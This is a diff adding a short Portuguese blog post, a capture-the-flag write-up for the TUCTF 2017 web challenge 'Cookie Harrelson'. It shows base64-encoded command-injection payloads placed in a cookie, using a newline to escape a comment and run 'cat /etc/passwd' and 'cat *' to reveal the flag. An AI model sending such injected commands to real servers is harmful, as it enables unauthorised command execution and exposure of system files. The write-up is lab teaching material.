@@ -1,0 +1,35 @@
+---
+title: "TUCTF – Web Cookie Harrelson"
+layout: post
+date: 2017-11-26
+categories: writeups
+---
+
+Está chall nos entregava uma página web com a imagem do ator Woody Harrelson, não sei exatamente o porquê. Olhando os cookies da página conseguimos ver um cookie em base64...
+{% highlight bash %}
+echo "Y2F0IGluZGV4LnR4dCAj" | base64 -d
+cat index.txt #
+{% endhighlight %}
+
+Como o cookie está fazendo um "cat" em index.txt, podemos tentar executar comandos via cookie, porém, ao tentar apenas mudar o cookie, ele nos retorna o mesmo cookie porém com o nosso cookie novo concatenado.
+Para bypassar isso e conseguir a flag, tive que usar uma quebra de linha para o comentário não pegar o meu comando...
+
+{% highlight basg %}
+echo "
+cat /etc/passwd" | base64
+CmNhdCAvZXRjL3Bhc3N3ZAo=
+{% endhighlight %}
+
+<a href="https://imgur.com/5vIdYS4"><img src="https://i.imgur.com/5vIdYS4.png" title="source: imgur.com" /></a>
+
+Depois disso tentei executar alguns comandos porém, parece que o único comando que realmente funcionava era o cat, então, me restou tentar printar o diretório inteiro para buscar a flag...
+
+{% highlight bash %}
+echo "
+cat *" | base64
+CmNhdCAqCg==
+{% endhighligh %}
+
+TUCTF{D0nt_3x3cut3_Fr0m_C00k13s}
+
+<a href="https://imgur.com/5vIdYS4"><img src="https://i.imgur.com/5vIdYS4.png" title="source: imgur.com" /></a>
